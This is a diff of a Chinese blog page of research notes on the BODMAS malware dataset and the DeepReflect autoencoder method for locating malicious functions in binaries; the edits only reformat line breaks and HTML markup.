-<p>我们描述并发布了一个名为BODMAS的开放PE恶意软件数据集，以促进基于机器学习的恶意软件分析的研究工作。通过仔细检查现有的open PE恶意软件数据集，我们发现了两个缺失的功能（即<strong>最近/时间戳</strong>的恶意软件样本和精心策划的<strong>家族信息</strong>），这限制了研究人员研究<strong>概念漂移和恶意软件系列演化</strong>等紧迫问题的能力。出于这些原因，我们发布了一个新的数据集来填补空白。<strong>BODMAS数据集包含从2019年8月至2020年9月收集的57293个恶意软件样本和77142个良性样本，以及精心策划的家族信息（581个家族）</strong>。我们还进行了初步分析，以说明概念漂移的影响，并讨论该数据集如何有助于促进现有和未来的研究工作。</p>
+<p>我们描述并发布了一个名为BODMAS的开放PE恶意软件数据集，以促进基于机器学习的恶意软件分析的研究工作。通过仔细检查现有的open
+PE恶意软件数据集，我们发现了两个缺失的功能（即<strong>最近/时间戳</strong>的恶意软件样本和精心策划的<strong>家族信息</strong>），这限制了研究人员研究<strong>概念漂移和恶意软件系列演化</strong>等紧迫问题的能力。出于这些原因，我们发布了一个新的数据集来填补空白。<strong>BODMAS数据集包含从2019年8月至2020年9月收集的57293个恶意软件样本和77142个良性样本，以及精心策划的家族信息（581个家族）</strong>。我们还进行了初步分析，以说明概念漂移的影响，并讨论该数据集如何有助于促进现有和未来的研究工作。</p>
 <h3><span id="二-说明">二、说明</span></h3>
-<p>如今，研究人员[30]、[5]、[11]、[6]和反病毒供应商[1]将机器学习模型（包括深度神经网络）广泛应用于恶意软件分析任务中。在这一工作领域，拥有公共数据集和开放基准是非常可取的。一方面，这些数据集将有助于促进解决开放性挑战的新工作（例如，对抗性机器学习、可解释技术[28]、[10]）。另一方面，公共基准和数据集可以帮助研究人员轻松地比较他们的模型，并跟踪整个社区的进展。然而，创建开放式恶意软件数据集是一项极具挑战性的工作。例如，[5]的作者讨论了许多此类挑战，包括<strong>法律限制、标记恶意软件样本的成本和难度，以及潜在的安全责任</strong>。除了这些因素外，另一个关键挑战是恶意软件（以及良性软件）的动态演化性质[20]。随着时间的推移，新的恶意软件系列和变种不断出现，它们不断地对底层数据分布进行更改。因此，随着时间的推移，不断需要发布新的数据集和基准。在过去的十年中，只有少数公开的PE恶意软件数据集发布到研究社区[30]。值得注意的例子包括Microsoft恶意软件分类挑战数据集[24]、Ember[5]、**UCSB打包恶意软件数据集[2]**和最近的SOREL-20M数据集[11]。我们在表一中总结了它们的主要特征。</p>
+<p>如今，研究人员[30]、[5]、[11]、[6]和反病毒供应商[1]将机器学习模型（包括深度神经网络）广泛应用于恶意软件分析任务中。在这一工作领域，拥有公共数据集和开放基准是非常可取的。一方面，这些数据集将有助于促进解决开放性挑战的新工作（例如，对抗性机器学习、可解释技术[28]、[10]）。另一方面，公共基准和数据集可以帮助研究人员轻松地比较他们的模型，并跟踪整个社区的进展。然而，创建开放式恶意软件数据集是一项极具挑战性的工作。例如，[5]的作者讨论了许多此类挑战，包括<strong>法律限制、标记恶意软件样本的成本和难度，以及潜在的安全责任</strong>。除了这些因素外，另一个关键挑战是恶意软件（以及良性软件）的动态演化性质[20]。随着时间的推移，新的恶意软件系列和变种不断出现，它们不断地对底层数据分布进行更改。因此，随着时间的推移，不断需要发布新的数据集和基准。在过去的十年中，只有少数公开的PE恶意软件数据集发布到研究社区[30]。值得注意的例子包括Microsoft恶意软件分类挑战数据集[24]、Ember[5]、<strong>UCSB打包恶意软件数据集[2]</strong>和最近的SOREL-20M数据集[11]。我们在表一中总结了它们的主要特征。</p>
 <blockquote>
-<p>[30] Survey of machine learning techniques for malware analysis. (2019 C&amp;S)</p>
-<p>[5] Ember: an open dataset for training static pe malware machine learning models</p>
-<p>[11] SOREL-20M: A Large Scale Benchmark Dataset for Malicious PE Detection</p>
-<p><strong>[6] Scalable, behavior-based malware clustering (2009 NDSS)</strong></p>
-<p><strong>[28] Exploring backdoor poisoning attacks against malware classifiers</strong></p>
-<p><strong>[10] Maldae: Detecting and explaining malware based on correlation and fusion of static and dynamic characteristics. (2019 C&amp;S)</strong></p>
+<p>[30] Survey of machine learning techniques for malware analysis.
+(2019 C&amp;S)</p>
+<p>[5] Ember: an open dataset for training static pe malware machine
+learning models</p>
+<p>[11] SOREL-20M: A Large Scale Benchmark Dataset for Malicious PE
+Detection</p>
+<p><strong>[6] Scalable, behavior-based malware clustering (2009
+NDSS)</strong></p>
+<p><strong>[28] Exploring backdoor poisoning attacks against malware
+classifiers</strong></p>
+<p><strong>[10] Maldae: Detecting and explaining malware based on
+correlation and fusion of static and dynamic characteristics. (2019
+C&amp;S)</strong></p>
 <p>[20]</p>
 </blockquote>
 
@@ -3305,15 +3583,16 @@ github地址：<br>
     
     
     <div class="post-body" itemprop="articleBody">
-          <h2><span id="usenixsec21-deepreflect通过二进制重构发现恶意行为经典">USENIXSec21 DeepReflect：通过二进制重构发现恶意行为（经典）</span></h2>
+          <h2><span id="usenixsec21deepreflect通过二进制重构发现恶意行为经典">USENIXSec21
+DeepReflect：通过二进制重构发现恶意行为（经典）</span></h2>
 <blockquote>
 <p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg5MTM5ODU2Mg&amp;mid=2247495981&amp;idx=1&amp;sn=fa34f5211e67a7d6c144019424657d22&amp;chksm=cfcf41e0f8b8c8f6e91705e142147a6803ca1af45aa8173727e7858788b1473da5b00db25d7b&amp;scene=178&amp;cur_album_id=1776483007625822210#rd">参考材料</a></p>
-<p>原文作者：Evan Downing, Yisroel Mirsky, Kyuhong Park, Wenke Lee<br>
-原文标题：DeepReflect: Discovering Malicious Functionality through<br>
-Binary Reconstruction<br>
-原文链接：<a target="_blank" rel="noopener" href="https://www.usenix.org/conference/usenixsecurity21/presentation/downing">https://www.usenix.org/conference/usenixsecurity21/presentation/downing</a><br>
-发表会议：USENIXSec 2021<br>
-<strong>代码地址</strong>：<a target="_blank" rel="noopener" href="https://github.com/evandowning/deepreflect">https://github.com/evandowning/deepreflect</a></p>
+<p>原文作者：Evan Downing, Yisroel Mirsky, Kyuhong Park, Wenke Lee
+原文标题：DeepReflect: Discovering Malicious Functionality through
+Binary Reconstruction
+原文链接：https://www.usenix.org/conference/usenixsecurity21/presentation/downing
+发表会议：USENIXSec 2021
+<strong>代码地址</strong>：https://github.com/evandowning/deepreflect</p>
 </blockquote>
 <h3><span id="一-摘要">一、摘要</span></h3>
 <p>深度学习已在恶意软件分类任务中表现出良好的结果。然而：</p>
@@ -3325,7 +3604,8 @@ Binary Reconstruction<br>
 <ul>
 <li>为了定位恶意软件组件，我们以一种新型（novel）方式，即首先使用一个<strong>无监督的深度神经网络l来定位恶意软件中恶意组件（函数）的位置</strong></li>
 <li><strong>其次，通过半监督聚类分析对恶意组件进行分类，根据恶意行为分类确定恶意函数的行为</strong>，其中分析人员在他们的日常工作流程中逐步提供标签</li>
-<li>该工具是实用的，因为它不需要数据标记（require no data labeling）来训练定位模型，也不需要最小/非侵入性标记来增量地训练分类器</li>
+<li>该工具是实用的，因为它不需要数据标记（require no data
+labeling）来训练定位模型，也不需要最小/非侵入性标记来增量地训练分类器</li>
 </ul>
 <h4><span id="11-企业界对比capa">1.1 <strong>企业界对比：CAPA</strong></span></h4>
 <p>我们通过5个恶意软件分析人员对超过26k个恶意软件样本进行评估。<strong>实验发现，DeepReflect让每个分析人员需要逆向工程的函数数量平均减少了85%</strong>。本文方法还可以检测到80%的恶意软件组件，而当使用基于签名的工具CAPA时，该值仅为43%。</p>
@@ -3333,7 +3613,12 @@ Binary Reconstruction<br>
 <p>此外，DeepReflect提出的自动编码器（autoencoder）比Shap（一种人工智能解释工具）表现得更好。这一点很重要，因为<strong>Shap是一种最先进（state-of-the-art）的方法，需要一个标记的数据集</strong>，而我们的自动编码器不需要。</p>
 <h3><span id="二-引言">二、引言</span></h3>
 <h4><span id="21-背景引出挑战">2.1 背景引出挑战</span></h4>
-<p>静态逆向工程恶意软件可能是一个手动且乏味的过程。公司每周可以收到多达 500 万个PE样本。虽然大多数组织提前对这些样本进行分类（triage），以减少要分析的恶意软件数量（即，检查 VirusTotal来获取反病毒 (AV) 引擎结果、在受控沙箱中执行样本、提取静态和动态签名等） ，但最终仍然需要静态逆向工程的恶意软件样本。这是因为<strong>总会有新的恶意软件样本</strong>，没有被反病毒公司分析过，或者缺乏签名来识别这些新样本。最终，该样本有可能会拒绝在分析人员的动态沙箱（sandbox）中执行。</p>
+<p>静态逆向工程恶意软件可能是一个手动且乏味的过程。公司每周可以收到多达
+500
+万个PE样本。虽然大多数组织提前对这些样本进行分类（triage），以减少要分析的恶意软件数量（即，检查
+VirusTotal来获取反病毒 (AV)
+引擎结果、在受控沙箱中执行样本、提取静态和动态签名等）
+，但最终仍然需要静态逆向工程的恶意软件样本。这是因为<strong>总会有新的恶意软件样本</strong>，没有被反病毒公司分析过，或者缺乏签名来识别这些新样本。最终，该样本有可能会拒绝在分析人员的动态沙箱（sandbox）中执行。</p>
 <p>当前的解决方案以为恶意软件样本创建签名、分类和聚类的形式存在。然而，这些解决方案只能预测样本的类别（例如，良性与恶意，或特定的恶意软件家族）。<strong>他们无法定位或解释恶意软件样本本身内部的行为（定位恶意函数位置、解释恶意函数行为），而分析师需要执行（perform）这些行为来生成报告并改进他们公司的恶意软件检测产品</strong>。事实上，由于工作量过大，该领域已呈现了倦怠。</p>
 <p>为了确定他们的需求，我们咨询了四名逆向工程恶意软件分析师（一名来自AV公司，三名来自政府部门）。本文发现，如果恶意软件分析师有一个工具可以：</p>
 <ul>
@@ -3359,7 +3644,8 @@ Binary Reconstruction<br>
 <li>使用分析人员在日常工作流程中所做的注释（即少量人工分析的函数行为标签）来标记聚类结果</li>
 </ul>
 <p><strong>这种方法是半监督的，因为每个类簇（cluster）只需要少数函数的行为标签（如三个）即可将大多数标签分配给整个集群</strong>。随着时间推移，我们可以将AE识别的函数映射到聚类模型来预测函数的类别（如，C&amp;C、特权升级等），即认为函数和最接近的类簇有相同的行为标签。这反过来又节省了分析人员的时间，因为他们不必一次又一次地对相同的代码进行逆向工程。</p>
-<p>注意，无监督 AE 为恶意软件分析人员提供了即时实用程序，无需训练或使用半监督聚类模型。这是因为它：</p>
+<p>注意，无监督 AE
+为恶意软件分析人员提供了即时实用程序，无需训练或使用半监督聚类模型。这是因为它：</p>
 <ul>
 <li><strong>通过对最相关的函数进行排序（重构误差）来吸引分析师的注意力</strong></li>
 <li>过滤掉可能需要花费分析师数小时或数天时间来解释的函数</li>
@@ -3378,42 +3664,53 @@ Binary Reconstruction<br>
 <h4><span id="23-创新contribution">2.3 创新（Contribution）</span></h4>
 <p><strong>我们的贡献如下：</strong></p>
 <ul>
-<li><strong>提出了一个新颖的工具，它可以帮助恶意软件分析师：(1) 在静态恶意软件样本中自动定位和识别恶意行为，(2) 洞察分析不同恶意软件家族之间的功能关系。</strong></li>
-<li><strong>提出一种在静态分析中使用机器学习的新颖实用方法</strong>：（1) AE训练是在一种无监督方式下进行的，<strong>无需为系统标注任何样本</strong>，就可以产生突出显示恶意软件组件的实用程序，(2) 分类是以半监督方式完成，<strong>具有最小的干预</strong>：分析人员的常规工作流的注释用作标签，群集中的大多数标签用于对相关的恶意软件组件进行分类。</li>
-<li>本文提出了一种解释框架（如我们提出的 AE 或 SHAP）定位恶意软件重要部分的方法，该方法可以<strong>映射回原始二进制或控制流图的特征</strong>。</li>
+<li><strong>提出了一个新颖的工具，它可以帮助恶意软件分析师：(1)
+在静态恶意软件样本中自动定位和识别恶意行为，(2)
+洞察分析不同恶意软件家族之间的功能关系。</strong></li>
+<li><strong>提出一种在静态分析中使用机器学习的新颖实用方法</strong>：（1)
+AE训练是在一种无监督方式下进行的，<strong>无需为系统标注任何样本</strong>，就可以产生突出显示恶意软件组件的实用程序，(2)
+分类是以半监督方式完成，<strong>具有最小的干预</strong>：分析人员的常规工作流的注释用作标签，群集中的大多数标签用于对相关的恶意软件组件进行分类。</li>
+<li>本文提出了一种解释框架（如我们提出的 AE 或
+SHAP）定位恶意软件重要部分的方法，该方法可以<strong>映射回原始二进制或控制流图的特征</strong>。</li>
 </ul>
 <h3><span id="3-scope-amp-overview">3 <strong>Scope &amp; Overview</strong></span></h3>
 <h4><span id="31-motivation">3.1 Motivation</span></h4>
-<img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550446.png" alt="图片" style="zoom: 67%;">
-<p><font color="red"><strong>图1展示了一个典型的恶意软件分析师Molly的工作流程</strong> </font>。当给定一个恶意软件样本，Molly的任务是了解该样本在做什么，以便她写一份技术报告并改进公司的检测系统，从而在未来识别该类样本。</p>
-<ol>
+<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550446.png" alt="图片" style="zoom: 67%;"></p>
+<p><font color="red"><strong>图1展示了一个典型的恶意软件分析师Molly的工作流程</strong>
+</font>。当给定一个恶意软件样本，Molly的任务是了解该样本在做什么，以便她写一份技术报告并改进公司的检测系统，从而在未来识别该类样本。</p>
+<ol type="1">
 <li><strong>首先查询VT（virtotul）和其他组织</strong>，以确定他们以前是否见过这个特定的样本，然而并没有</li>
 <li>在一个自定义的<strong>沙箱中执行样本以了解其动态行为</strong>，然而没有显示任何恶意行为或拒绝执行；运行一些内部工具，诱使恶意软件执行其隐藏的行为，但仍无效时；</li>
-<li>尝试<strong>脱壳（unpacking）<strong>和</strong>静态逆向分析恶意样本</strong>，以了解其潜在行为</li>
-<li><font color="red"><strong>在反汇编程序（IDA Pro 或 BinaryNinja）中打开脱壳后的样本，被数千个函数淹没，接着运行各种静态签名检测工具来识别恶意软件的某些特定恶意组件，但仍无效</strong></font></li>
-<li>逐个<strong>查看每个函数（可能通过 API 调用和字符串过滤）以尝试了解它们的行为</strong></li>
+<li>尝试<strong>脱壳（unpacking）</strong>和<strong>静态逆向分析恶意样本</strong>，以了解其潜在行为</li>
+<li><font color="red"><strong>在反汇编程序（IDA Pro 或
+BinaryNinja）中打开脱壳后的样本，被数千个函数淹没，接着运行各种静态签名检测工具来识别恶意软件的某些特定恶意组件，但仍无效</strong></font></li>
+<li>逐个<strong>查看每个函数（可能通过 API
+调用和字符串过滤）以尝试了解它们的行为</strong></li>
 <li><strong>在分析样本的行为后，撰写分析报告（包含基本信息、IOC、静态签名等）</strong></li>
 </ol>
-<p>然而，当新的样本出现时，Molly需要重复同样的任务。由于这种重复的体力劳动，这项工作对Molly来说变得单调乏味和耗时。<font color="red"> <strong>DEEPREFLECT旨在减轻恶意分析师的分析工作，能逆向一个未知的恶意软件样本，从而减轻他们繁重的任务，并为相似的函数标注行为标签。</strong></font></p>
+<p>然而，当新的样本出现时，Molly需要重复同样的任务。由于这种重复的体力劳动，这项工作对Molly来说变得单调乏味和耗时。<font color="red">
+<strong>DEEPREFLECT旨在减轻恶意分析师的分析工作，能逆向一个未知的恶意软件样本，从而减轻他们繁重的任务，并为相似的函数标注行为标签。</strong></font></p>
 <h4><span id="32-proposed-solution">3.2 Proposed Solution</span></h4>
 <p>我们提出了<strong>DEEPREFLECT</strong>，该工具能：</p>
 <ul>
-<li>
-<p><strong>定位恶意软件binary中的恶意函数</strong></p>
+<li><p><strong>定位恶意软件binary中的恶意函数</strong></p>
 <blockquote>
 <p>locates malicious functions within a malware binary</p>
-</blockquote>
-</li>
-<li>
-<p><strong>描述这些函数的行为</strong></p>
+</blockquote></li>
+<li><p><strong>描述这些函数的行为</strong></p>
 <blockquote>
 <p>describes the behaviors of those functions</p>
-</blockquote>
-</li>
+</blockquote></li>
 </ul>
-<p>虽然分析人员可能首先尝试通过搜索特定的字符串和API调用来静态地识别行为，但这些行为很容易被分析人员混淆或隐藏（ obfuscated or hidden）。<strong>DEEPREFLECT没有做出这样的假设，并试图通过控制流图(control-flow graph，CFG)特性和API调用（API calls）的组合来识别这些相同的行为</strong>。</p>
-<p><font color="red"> <strong>DEEPREFLECT通过学习正常情况下良性的二进制函数来工作</strong></font>。因此，任何异常都表明这些函数不会出现在良性二进制文件中，而可能被用于恶意行为中。这些异常函数更可能是恶意函数，分析师可以只分析它们，从而缩小工作范围。如图5所示，DEEPREFLECT将分析师必须分析的函数数量平均减少了 85%。此外，实验表明我们的方法优于旨在实现相同目标的基于签名的技术。</p>
-<img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550151.png" alt="图片" style="zoom:67%;">
+<p>虽然分析人员可能首先尝试通过搜索特定的字符串和API调用来静态地识别行为，但这些行为很容易被分析人员混淆或隐藏（
+obfuscated or
+hidden）。<strong>DEEPREFLECT没有做出这样的假设，并试图通过控制流图(control-flow
+graph，CFG)特性和API调用（API
+calls）的组合来识别这些相同的行为</strong>。</p>
+<p><font color="red">
+<strong>DEEPREFLECT通过学习正常情况下良性的二进制函数来工作</strong></font>。因此，任何异常都表明这些函数不会出现在良性二进制文件中，而可能被用于恶意行为中。这些异常函数更可能是恶意函数，分析师可以只分析它们，从而缩小工作范围。如图5所示，DEEPREFLECT将分析师必须分析的函数数量平均减少了
+85%。此外，实验表明我们的方法优于旨在实现相同目标的基于签名的技术。</p>
+<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550151.png" alt="图片" style="zoom:67%;"></p>
 <h4><span id="33-research-goals">3.3 Research Goals</span></h4>
 <p>本文有四个主要目标：</p>
 <ul>
@@ -3424,66 +3721,110 @@ Binary Reconstruction<br>
 </ul>
 <h3><span id="4-模型设计">4、模型设计</span></h3>
 <h4><span id="41-总体框架">4.1 总体框架</span></h4>
-<p><strong>DEEPREFLECT的目标是识别恶意软件二进制中的恶意函数</strong>。在实践中，<font color="red"><strong>它通过定位异常基本块（感兴趣区域 regions of interest，RoI)来识别可能是恶意的函数</strong></font>。然后，分析人员必须确定这些函数是恶意行为还是良性行为。DEEPREFLECT有两个主要步骤，如图2所示：</p>
+<p><strong>DEEPREFLECT的目标是识别恶意软件二进制中的恶意函数</strong>。在实践中，<font color="red"><strong>它通过定位异常基本块（感兴趣区域
+regions of
+interest，RoI)来识别可能是恶意的函数</strong></font>。然后，分析人员必须确定这些函数是恶意行为还是良性行为。DEEPREFLECT有两个主要步骤，如图2所示：</p>
 <ul>
-<li><strong>RoI检测（RoI detection）</strong>：通过AE（AutoEncoder）来执行的</li>
-<li><strong>RoI注释（RoI annotation）</strong>：通过对每个函数的所有RoI聚类，并将标记聚类结果来执行注释。注意，一个函数可能有多个ROI，用每个函数自己的ROI的均值表示该函数，然后对函数聚类</li>
+<li><strong>RoI检测（RoI
+detection）</strong>：通过AE（AutoEncoder）来执行的</li>
+<li><strong>RoI注释（RoI
+annotation）</strong>：通过对每个函数的所有RoI聚类，并将标记聚类结果来执行注释。注意，一个函数可能有多个ROI，用每个函数自己的ROI的均值表示该函数，然后对函数聚类</li>
 </ul>
-<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550631.png" alt="图片"></p>
+<figure>
+<img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550631.png" alt="图片">
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
 <h5><span id="1术语-terminology">（1）术语 Terminology</span></h5>
-<p><strong>首先定义恶意行为（malicious behaviors）的含义</strong>。我们根据识别恶意软件源代码的<strong>核心组件</strong>（例如，拒绝服务功能、垃圾邮件功能、键盘记录器功能、命令和控制C&amp;C功能、利用远程服务等）来生成真实情况（ground-truth）。<font color="red"><strong>通过MITRE ATT&amp;CK框架描述</strong></font>，如表3所示。</p>
-<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550843.png" alt="图片"></p>
-<p><strong>然而，当静态逆向工程评估恶意软件二进制文件时（即在野生恶意软件二进制 in-the-wild malware binaries），我们有时无法肯定地将观察到的低级函数归因于更高级别的描述</strong>。</p>
-<p>例如，恶意软件可能会因为许多不同的原因修改注册表项，但有时确定哪个注册表项因什么原因而被修改是很困难的，因此只能粗略地标记为“<font color="red"><code>防御逃避：修改注册表（Defense Evasion: Modify Registry）</code>” </font>。即使是像CAPA这样的现代工具，也能识别出这些类型的模糊标签。<strong>因此，在我们的评估中，我们将“恶意行为”表示为可由MITRE ATT&amp;CK框架描述的函数。</strong></p>
+<p><strong>首先定义恶意行为（malicious
+behaviors）的含义</strong>。我们根据识别恶意软件源代码的<strong>核心组件</strong>（例如，拒绝服务功能、垃圾邮件功能、键盘记录器功能、命令和控制C&amp;C功能、利用远程服务等）来生成真实情况（ground-truth）。<font color="red"><strong>通过MITRE
+ATT&amp;CK框架描述</strong></font>，如表3所示。</p>
+<figure>
+<img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550843.png" alt="图片">
+<figcaption aria-hidden="true">图片</figcaption>
+</figure>
+<p><strong>然而，当静态逆向工程评估恶意软件二进制文件时（即在野生恶意软件二进制
+in-the-wild malware
+binaries），我们有时无法肯定地将观察到的低级函数归因于更高级别的描述</strong>。</p>
+<p>例如，恶意软件可能会因为许多不同的原因修改注册表项，但有时确定哪个注册表项因什么原因而被修改是很困难的，因此只能粗略地标记为“<font color="red"><code>防御逃避：修改注册表（Defense Evasion: Modify Registry）</code>”
+</font>。即使是像CAPA这样的现代工具，也能识别出这些类型的模糊标签。<strong>因此，在我们的评估中，我们将“恶意行为”表示为可由MITRE
+ATT&amp;CK框架描述的函数。</strong></p>
 <h5><span id="2-roi-detection">（2） <strong>RoI Detection</strong></span></h5>
-<p><strong>检测的目标是自动识别恶意软件二进制文件中的恶意区域</strong>。例如，我们希望检测C&amp;C逻辑的位置，而不是检测该逻辑的特定组件（例如，网络API调用connect()、send() 和 recv()）。<strong>RoI检测的优点是分析人员可以快速定位启动和操作恶意行为的特定代码区域</strong>。先前的工作只关注于创建临时签名，简单地将二进制文件标识为恶意软件或仅基于API调用的某些函数。这对于分析人员扩大他们的工作特别有用（即不仅仅依赖手动逆向工程和领域专业知识）。</p>
+<p><strong>检测的目标是自动识别恶意软件二进制文件中的恶意区域</strong>。例如，我们希望检测C&amp;C逻辑的位置，而不是检测该逻辑的特定组件（例如，网络API调用connect()、send()
+和
+recv()）。<strong>RoI检测的优点是分析人员可以快速定位启动和操作恶意行为的特定代码区域</strong>。先前的工作只关注于创建临时签名，简单地将二进制文件标识为恶意软件或仅基于API调用的某些函数。这对于分析人员扩大他们的工作特别有用（即不仅仅依赖手动逆向工程和领域专业知识）。</p>
 <h5><span id="3-roi-annotation"><strong>(3) RoI Annotation</strong></span></h5>
 <p><strong>注释的目标是自动标记包含RoI的函数的行为，即识别恶意函数在做什么</strong>。由于分析人员为标记集群所执行的初始工作是一个长尾分布。也就是说，只需要前期做比较重要的工作，随着时间推移，工作量会减少。这个过程的优点很简单：它为分析人员提供了一种自动生成未知样本的报告及见解的方法。例如，如果恶意软件示例的变体包含与之前的恶意软件示例相似的逻辑（但对于分析人员来说看起来不同以至于不熟悉），我们的工具为他们提供了一种更快实现这一点的方法。</p>
 <h4><span id="42-roi-detection">4.2 RoI Detection</span></h4>
 <p>首先介绍了AutoEncode（AE）神经网络。此外，先前的工作已经证明，当自动编码器在良性分布上进行训练时，AE可以检测到恶意（异常）行为。我们的假设是，与良性二进制文件相比，恶意软件二进制文件将包含相似但独特的功能。</p>
-<p>当使用大量良性样本训练AE后，给定一个随机的样本，可以利用公式(2)计算，超过<strong>MSE</strong>的即认为是恶意区域，突出显示ROI异常基本块。与先前识别整个样本为恶意区域的工作相比，我们识别了每个样本中的恶意区域。具体而言，我们计算的 <code>localized MSE</code> 定义如下：<br>
-$$<br>
-\operatorname{LMSE}(x, \hat{x})=\left(x<sup>{(i)}-\hat{x}</sup>{(i)}\right)^{2}<br>
-$$</p>
-<h4><span id="1features"><font color="red"> （1）<strong>Features</strong></font></span></h4>
-<p>为了在二进制样本中定位恶意行为的位置，编码使用的特征必须一对一的映射回原样本。<strong>因此，作者将每个二进制文件表示为一个 m×c 的矩阵，该矩阵使用c个静态特征捕获前m个基本块以总结样本的behavior</strong>。<strong>m设置为20k个基本块，是因为95%的数据集样本具有20k或者更少的基本块， c设置为18个特征</strong>。<strong>基本块</strong>通常是以控制传输指令结尾的一系列指令。当然，根据反汇编程序的不同，基本块可能会有不同的表示，因此这种严格的定义可能不适用于所有静态恶意软件分析系统。</p>
-<p>我们特征（c）的灵感来自于先前工作中发现的特征，即<strong>属性控制流图（attributed control flow graph，ACFG）<strong>特征</strong>[23,75]</strong>。在这些工作中，ACFG特征被选择来执行二进制相似性，因为它们假设这些特征(由结构和数字CFG特征组成)将在多个平台和编译器上是一致的。</p>
+<p>当使用大量良性样本训练AE后，给定一个随机的样本，可以利用公式(2)计算，超过<strong>MSE</strong>的即认为是恶意区域，突出显示ROI异常基本块。与先前识别整个样本为恶意区域的工作相比，我们识别了每个样本中的恶意区域。具体而言，我们计算的
+<code>localized MSE</code> 定义如下： <span class="math display">\[
+\operatorname{LMSE}(x, \hat{x})=\left(x^{(i)}-\hat{x}^{(i)}\right)^{2}
+\]</span></p>
+<h4><span id="1features"><font color="red">
+（1）<strong>Features</strong></font></span></h4>
+<p>为了在二进制样本中定位恶意行为的位置，编码使用的特征必须一对一的映射回原样本。<strong>因此，作者将每个二进制文件表示为一个
+m×c
+的矩阵，该矩阵使用c个静态特征捕获前m个基本块以总结样本的behavior</strong>。<strong>m设置为20k个基本块，是因为95%的数据集样本具有20k或者更少的基本块，
+c设置为18个特征</strong>。<strong>基本块</strong>通常是以控制传输指令结尾的一系列指令。当然，根据反汇编程序的不同，基本块可能会有不同的表示，因此这种严格的定义可能不适用于所有静态恶意软件分析系统。</p>
+<p>我们特征（c）的灵感来自于先前工作中发现的特征，即<strong>属性控制流图（attributed
+control flow
+graph，ACFG）</strong>特征<strong>[23,75]</strong>。在这些工作中，ACFG特征被选择来执行二进制相似性，因为它们假设这些特征(由结构和数字CFG特征组成)将在多个平台和编译器上是一致的。</p>
 <blockquote>
-<p><strong>[23] Scalable graph-based bug search for firmware images.  2016 CCS</strong></p>
-<p><strong>[75] Neural Network-based Graph Embedding for Cross-Platform Binary Code Similarity Detection. 2017 CCS</strong></p>
+<p><strong>[23] Scalable graph-based bug search for firmware images.
+2016 CCS</strong></p>
+<p><strong>[75] Neural Network-based Graph Embedding for Cross-Platform
+Binary Code Similarity Detection. 2017 CCS</strong></p>
 </blockquote>
 <p>虽然可以说我们的目标是相似的（即识别二进制文件之间的异同），但我们专门为研究恶意软件定制了这些功能。特别是，我们选择了autoencoder要使用的功能，以捕获更高级别的行为。我们的特征包括每个<strong>基本块中的指令类型计数</strong>（为ACFG特征提取的指令类型的更详细形式）、<strong>CFG的结构特征</strong>和<strong>API调用类别</strong>（用于总结恶意软件程序行为[18]），将每个基本块总结如下：</p>
-<h5><span id="a-structural-characteristics"><font color="red">(a) <strong>Structural Characteristics</strong> </font></span></h5>
-<p><strong>结构特征2个</strong>，每个<strong>基本块的后代（offspring）数量</strong>和<strong>betweenness score</strong>，可以描述不同功能的<strong>控制流结构</strong>，比如网络通信（connect, send, recv）或文件加密（findfile, open, read, encrypt, write, close）。如图所示:</p>
-<img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550517.png" alt="image-20220602164403223" style="zoom:67%;">
+<h5><span id="astructural-characteristics"><font color="red">(a)
+<strong>Structural Characteristics</strong> </font></span></h5>
+<p><strong>结构特征2个</strong>，每个<strong>基本块的后代（offspring）数量</strong>和<strong>betweenness
+score</strong>，可以描述不同功能的<strong>控制流结构</strong>，比如网络通信（connect,
+send, recv）或文件加密（findfile, open, read, encrypt, write,
+close）。如图所示:</p>
+<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550517.png" alt="image-20220602164403223" style="zoom:67%;"></p>
 <blockquote>
-<p>该恶意软件通过InternetOpenUrlA() 访问URL，通过CreateFileA() 创建文件，并通过InternetReadFile() 和WriteFile() 将从连接接收的数据写入文件。</p>
+<p>该恶意软件通过InternetOpenUrlA() 访问URL，通过CreateFileA()
+创建文件，并通过InternetReadFile() 和WriteFile()
+将从连接接收的数据写入文件。</p>
 </blockquote>
 <p><strong>(b) Arithmetic Instructions</strong></p>
-<p><strong>算术指令3个</strong>，每个<strong>基本块基本数学、逻辑运算、位移指令的数量</strong>（“basic math”, “logic operation”, and “bit shifting”）。这些算术指令特征可以用来表示如何对更高层次的行为执行数学运算，以及数字如何与函数交互。例如，加密函数可能包含大量的xor指令，混淆函数可能包含逻辑和位移操作的组合等。<strong>我们从《英特尔体系结构软件开发人员手册》[26]中检索到这些说明</strong>。此外，我们还提供了一个恶意软件示例，在图中展示了这些类型的功能。</p>
-<img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550537.png" alt="image-20220602164519015" style="zoom:67%;">
+<p><strong>算术指令3个</strong>，每个<strong>基本块基本数学、逻辑运算、位移指令的数量</strong>（“basic
+math”, “logic operation”, and “bit
+shifting”）。这些算术指令特征可以用来表示如何对更高层次的行为执行数学运算，以及数字如何与函数交互。例如，加密函数可能包含大量的xor指令，混淆函数可能包含逻辑和位移操作的组合等。<strong>我们从《英特尔体系结构软件开发人员手册》[26]中检索到这些说明</strong>。此外，我们还提供了一个恶意软件示例，在图中展示了这些类型的功能。</p>
+<p><img src="https://lzy-picture.oss-cn-beijing.aliyuncs.com/img/202304191550537.png" alt="image-20220602164519015" style="zoom:67%;"></p>
 <blockquote>
 <p>此函数对数据执行各种按位操作。类似这样的复杂逻辑可以解释为执行某种除臭或解码，以隐藏恶意软件解释或收集的数据。</p>
 </blockquote>
-<p><strong>© Transfer Instructions</strong></p>
